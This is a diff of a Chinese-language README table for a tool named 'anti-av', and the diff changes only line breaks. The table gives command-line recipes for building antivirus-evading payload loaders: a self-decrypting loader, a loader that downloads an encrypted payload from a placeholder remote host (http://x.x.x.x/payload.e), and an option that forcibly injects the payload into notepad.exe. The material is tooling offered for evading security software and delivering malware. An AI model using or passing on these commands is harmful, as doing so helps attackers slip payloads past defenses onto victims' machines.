@@ -64,8 +64,8 @@ Usage of ./anti-av:
 | 形态              | 说明                    | 生成命令                                                     |
 | ----------------- | ----------------------- | ------------------------------------------------------------ |
 | 自解密   | 无                      | ./anti-av -p ~/Desktop/payload.bin                         |
-| 远程加载 | 无                      | 1、生成payload.e<br />./anti-av  -e -p ~/Desktop/payload.bin    <br />2、上传payload.e到公共下载服务<br />略<br />3、制作加载器<br />./anti-av -p http://x.x.x.x/payload.e |
-| 进程注入          | 会强制注入到notepad.exe | ./anti-av -p ~/Desktop/payload.bin -inject 或<br />./anti-av -p http://x.x.x.x/payload.e  -inject |
+| 远程加载 | 无                      | 1、生成payload.e<br />./anti-av  -e -p ~/Desktop/payload.bin    <br /><br />2、上传payload.e到公共下载服务<br />略<br /><br />3、制作加载器<br />./anti-av -p http://x.x.x.x/payload.e |
+| 进程注入          | 会强制注入到notepad.exe | ./anti-av -p ~/Desktop/payload.bin -inject 或<br /><br />./anti-av -p http://x.x.x.x/payload.e  -inject |
 |  |  |  |
 
 
